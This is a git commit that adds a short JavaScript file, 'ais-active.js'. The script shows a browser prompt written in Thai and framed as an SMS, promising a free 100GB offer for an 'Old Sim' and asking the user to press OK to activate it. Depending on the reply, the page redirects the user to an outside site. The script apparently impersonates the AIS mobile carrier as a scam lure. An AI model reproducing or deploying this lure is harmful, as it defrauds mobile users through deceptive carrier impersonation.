34a255f62bd95007136e4e9b9e41a69f71f24334
surepluger <adigunkola666@gmail.com>
2025-03-29 18:03:25 +0100

    Create ais-active.js

---
+++ ais-active.js
@@ -0,0 +1,5 @@
+var password = 'เปิดใช้งาน 100GB'
+password=prompt('SMS: ขอแสดงความยินดี ซิมการ์ดของคุณมีสิทธิ์ได้รับข้อเสนอพิเศษ 100GB Old Sim กดตกลงเพื่อเปิดใช้งานทันที ','เปิดใช้งาน 100GB');
+if (password != 'เปิดใช้งาน 100GB') {
+location.href='https://sureplug.org/ais';
+}
